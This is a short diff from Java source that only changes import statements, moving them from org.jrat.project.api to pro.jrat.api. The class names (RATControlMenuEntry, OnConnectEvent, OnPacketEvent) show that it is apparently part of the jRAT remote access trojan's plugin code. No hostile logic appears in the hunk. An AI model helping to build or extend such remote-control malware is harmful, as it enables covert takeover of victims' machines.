@@ -10,16 +10,16 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.jar.JarFile;
 
-import org.jrat.project.api.JarUtils;
-import org.jrat.project.api.PluginClassLoader;
-import org.jrat.project.api.RATControlMenuEntry;
-import org.jrat.project.api.RATMenuItem;
-import org.jrat.project.api.events.OnConnectEvent;
-import org.jrat.project.api.events.OnDisableEvent;
-import org.jrat.project.api.events.OnDisconnectEvent;
-import org.jrat.project.api.events.OnEnableEvent;
-import org.jrat.project.api.events.OnPacketEvent;
-import org.jrat.project.api.events.OnSendPacketEvent;
+import pro.jrat.api.JarUtils;
+import pro.jrat.api.PluginClassLoader;
+import pro.jrat.api.RATControlMenuEntry;
+import pro.jrat.api.RATMenuItem;
+import pro.jrat.api.events.OnConnectEvent;
+import pro.jrat.api.events.OnDisableEvent;
+import pro.jrat.api.events.OnDisconnectEvent;
+import pro.jrat.api.events.OnEnableEvent;
+import pro.jrat.api.events.OnPacketEvent;
+import pro.jrat.api.events.OnSendPacketEvent;
 
 import com.redpois0n.Main;
 import com.redpois0n.common.Version;
